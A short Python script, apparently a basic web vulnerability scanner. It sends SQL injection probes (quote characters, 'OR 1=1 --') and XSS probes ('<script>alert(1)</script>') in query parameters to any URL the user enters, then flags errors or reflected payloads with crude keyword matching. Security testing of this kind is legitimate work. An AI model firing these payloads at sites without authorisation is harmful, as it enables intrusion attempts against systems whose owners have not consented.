import requests
from bs4 import BeautifulSoup

# SQL Injection payloads
sql_payloads = ["'", "\"", " OR 1=1 --", " OR '1'='1' --"]

# XSS payloads
xss_payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>']

def scan_website(url):
    """Checks if the website is accessible."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[+] Website is accessible: {url}")
        else:
            print(f"[-] Received status code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error accessing {url}: {e}")
        return

def check_sql_injection(url):
    """Tests for SQL Injection vulnerabilities."""
    print("\n[+] Scanning for SQL Injection vulnerabilities...")
    for payload in sql_payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"[!] Possible SQL Injection vulnerability found: {test_url}")

def check_xss(url):
    """Tests for XSS vulnerabilities."""
    print("\n[+] Scanning for XSS vulnerabilities...")
    for payload in xss_payloads:
        test_url = f"{url}?search={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"[!] Possible XSS vulnerability found: {test_url}")

def main():
    """Main function to execute the scanner."""
    target_url = input("Enter the target website (e.g., http://example.com): ").strip()
    scan_website(target_url)
    check_sql_injection(target_url)
    check_xss(target_url)

if __name__ == "__main__":
    main()
